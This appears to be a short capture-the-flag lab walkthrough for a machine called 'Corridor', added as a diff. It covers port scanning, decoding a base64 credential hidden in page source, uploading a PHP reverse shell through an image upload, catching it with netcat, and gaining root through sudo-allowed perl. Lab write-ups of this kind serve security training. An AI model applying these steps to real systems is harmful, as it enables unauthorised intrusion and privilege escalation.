@@ -1,0 +1,72 @@
+----------------                               ------------------
+               :::::::::::;| CORRIDOR |;::::::::::::
+
+1) SPIN UP THE MACHINE AND NOTE IP.
+
+TASK - 1 (RECON)
+
+1. QUICK SCAN:
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Only port 80/HTTP open"
+"Minimalist webpage - check source"
+
+2. SOURCE INSPECTION:
+
+    "Hidden base64 in comment"
+    echo "dGVzdDp0ZXN0" | base64 -d
+    "Decodes to test:test"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. LOGIN ATTEMPT:
+
+    http://<ip>/login.php
+    "test:test works - access granted"
+
+2. FIND UPLOAD:
+
+    "Profile picture upload accepts .php"
+    "Upload reverse shell"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (GET SHELL)
+
+1. TRIGGER SHELL:
+
+    nc -lvnp 4444
+    "Access /uploads/shell.php"
+    "www-data shell obtained"
+
+2. FIND USER FLAG:
+
+    find / -name user* 2>/dev/null
+    cat /home/corridor/user.txt
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (PRIV ESC)
+
+1. CHECK SUDO:
+
+    sudo -l
+    "Can run /usr/bin/perl as root"
+    "Perl can spawn shells"
+
+2. GET ROOT:
+
+    sudo perl -e 'exec "/bin/sh";'
+    "ROOT ACCESS GRANTED!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/corridor/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- CORRIDOR CLEARED ----------
